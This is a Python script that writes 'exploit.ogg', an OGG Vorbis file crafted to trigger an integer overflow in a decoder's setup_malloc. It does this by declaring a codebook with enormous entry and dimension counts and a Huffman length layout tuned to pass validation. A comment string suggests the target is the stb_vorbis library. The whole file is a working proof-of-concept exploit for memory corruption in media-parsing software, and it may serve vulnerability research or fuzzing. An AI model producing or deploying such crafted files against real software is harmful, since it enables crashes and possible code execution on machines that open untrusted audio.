"""Craft OGG Vorbis file triggering setup_malloc overflow via codebook multiplicands."""
import struct, os

ENTRIES = 16519105
DIMS = 65
# Huffman: 258111 entries at len 23 + 16260994 at len 24 (Kraft sum = 1.0)

class BitWriter:
    def __init__(self):
        self.data = bytearray()
        self.cur = 0
        self.pos = 0
    def write(self, value, n):
        for i in range(n):
            if value & (1 << i):
                self.cur |= 1 << self.pos
            self.pos += 1
            if self.pos == 8:
                self.data.append(self.cur)
                self.cur = 0
                self.pos = 0
    def finish(self):
        if self.pos > 0:
            self.data.append(self.cur)
        return bytes(self.data)

def _ogg_crc_table():
    table = []
    for i in range(256):
        s = i << 24
        for _ in range(8):
            s = ((s << 1) ^ 0x04C11DB7) if s & 0x80000000 else (s << 1)
            s &= 0xFFFFFFFF
        table.append(s)
    return table
_CRC = _ogg_crc_table()

def ogg_crc(data):
    crc = 0
    for b in data:
        crc = ((crc << 8) ^ _CRC[(b ^ (crc >> 24)) & 0xFF]) & 0xFFFFFFFF
    return crc

def make_ogg_page(ht, serial, seq, gran, pkt):
    st = bytearray()
    rem = len(pkt)
    while rem >= 255: st.append(255); rem -= 255
    st.append(rem)
    hdr = bytearray(b"OggS") + bytes([0, ht])
    hdr += struct.pack("<Q", gran & 0xFFFFFFFFFFFFFFFF)
    hdr += struct.pack("<III", serial, seq, 0)
    hdr.append(len(st)); hdr += st
    page = bytearray(hdr + pkt)
    struct.pack_into("<I", page, 22, ogg_crc(page))
    return bytes(page)

bw = BitWriter()
bw.write(5, 8)
for c in b'vorbis': bw.write(c, 8)
bw.write(1, 8)  # 2 codebooks

# Codebook 0: minimal (1 dim, 2 entries, len 1, no VQ)
bw.write(0x42, 8); bw.write(0x43, 8); bw.write(0x56, 8)
bw.write(1, 8); bw.write(0, 8); bw.write(2, 8); bw.write(0, 8); bw.write(0, 8)
bw.write(0, 1); bw.write(0, 1); bw.write(0, 5); bw.write(0, 5); bw.write(0, 4)

# Codebook 1: overflow (entries=16519105, dims=65, ordered, lookup_type=1)
bw.write(0x42, 8); bw.write(0x43, 8); bw.write(0x56, 8)
bw.write(DIMS & 0xFF, 8); bw.write((DIMS >> 8) & 0xFF, 8)
bw.write(ENTRIES & 0xFF, 8); bw.write((ENTRIES >> 8) & 0xFF, 8); bw.write((ENTRIES >> 16) & 0xFF, 8)
bw.write(1, 1)  # ordered
bw.write(22, 5)  # initial length 23
bw.write(258111, 24)  # group 1
bw.write(16260994, 24)  # group 2
bw.write(1, 4)  # lookup_type=1
bw.write(0, 32); bw.write(0, 32); bw.write(0, 4); bw.write(0, 1)
bw.write(0, 1); bw.write(0, 1)  # 2 mults

# Minimal floor/residue/mapping/mode
bw.write(0, 6); bw.write(1, 16); bw.write(0, 5); bw.write(0, 4); bw.write(0, 4)
bw.write(0, 6); bw.write(0, 16); bw.write(0, 24); bw.write(31, 24)
bw.write(0, 24); bw.write(0, 6); bw.write(0, 8); bw.write(0, 3); bw.write(0, 1)
bw.write(0, 6); bw.write(0, 16); bw.write(0, 1); bw.write(0, 1); bw.write(0, 8); bw.write(0, 8)
bw.write(0, 6); bw.write(0, 1); bw.write(0, 16); bw.write(0, 16); bw.write(0, 8)
bw.write(1, 1)

setup = bw.finish()
ident = bytes([1]) + b'vorbis' + struct.pack('<IBIiii', 0, 1, 16000, 0, 0, 0) + bytes([6|(6<<4), 1])
comment = bytes([3]) + b'vorbis' + struct.pack('<I', 3) + b'stb' + struct.pack('<I', 0) + bytes([1])

serial = 0xDEAD0065
ogg = make_ogg_page(0x02, serial, 0, 0, ident) + make_ogg_page(0x00, serial, 1, 0, comment) + make_ogg_page(0x00, serial, 2, 0, setup)
with open("exploit.ogg", "wb") as f:
    f.write(ogg)
print(f"Wrote exploit.ogg: {len(ogg)} bytes")
